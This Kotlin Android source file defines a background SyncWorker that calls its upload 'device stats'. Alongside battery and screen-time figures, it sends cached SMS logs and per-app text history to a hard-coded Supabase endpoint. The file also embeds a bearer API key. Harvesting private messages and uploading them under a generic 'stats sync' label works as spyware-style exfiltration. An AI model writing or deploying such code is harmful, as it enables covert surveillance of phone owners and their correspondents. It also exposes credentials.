package com.example.myandroid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import androidx.core.app.NotificationCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.Calendar

class SyncWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        val notifManager = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val notifId = 999

        try {
            // 1. Show "Syncing..." Notification
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                val channel = NotificationChannel("sync_channel", "Data Sync", NotificationManager.IMPORTANCE_LOW)
                notifManager.createNotificationChannel(channel)
            }
            val notification = NotificationCompat.Builder(applicationContext, "sync_channel")
                .setContentTitle("Syncing Data")
                .setContentText("Uploading stats to cloud...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setProgress(0, 0, true)
                .build()
            notifManager.notify(notifId, notification)

            // 2. Prepare Data (Synchronous logic for Worker)
            val ctx = applicationContext
            val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val level = batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0
            val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val smsCount = prefs.getInt("sms_count", 0)
            val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
            val calendar = Calendar.getInstance()
            val endTime = calendar.timeInMillis
            calendar.set(Calendar.HOUR_OF_DAY, 0)
            val startTime = calendar.timeInMillis
            val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
            val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(stats.sumOf { it.totalTimeInForeground })

            val json = JSONObject()
            json.put("device_model", android.os.Build.MODEL)
            json.put("battery_level", level)
            json.put("sms_count", smsCount)
            json.put("screen_time_minutes", totalMins)
            json.put("android_version", android.os.Build.VERSION.RELEASE)
            json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
            json.put("text_history", JSONObject(prefs.getString("text_history_by_app", "{}")))
            json.put("trigger", "AUTO_WORKER")

            // 3. Upload
            val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/device_stats"
            val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

            val url = URL(supabaseUrl)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", supabaseKey)
            conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true
            conn.outputStream.use { it.write(json.toString().toByteArray()) }

            val code = conn.responseCode
            if (code in 200..299) {
                return Result.success()
            } else {
                return Result.retry()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            return Result.retry()
        } finally {
            // 4. Remove Notification
            notifManager.cancel(notifId)
        }
    }
}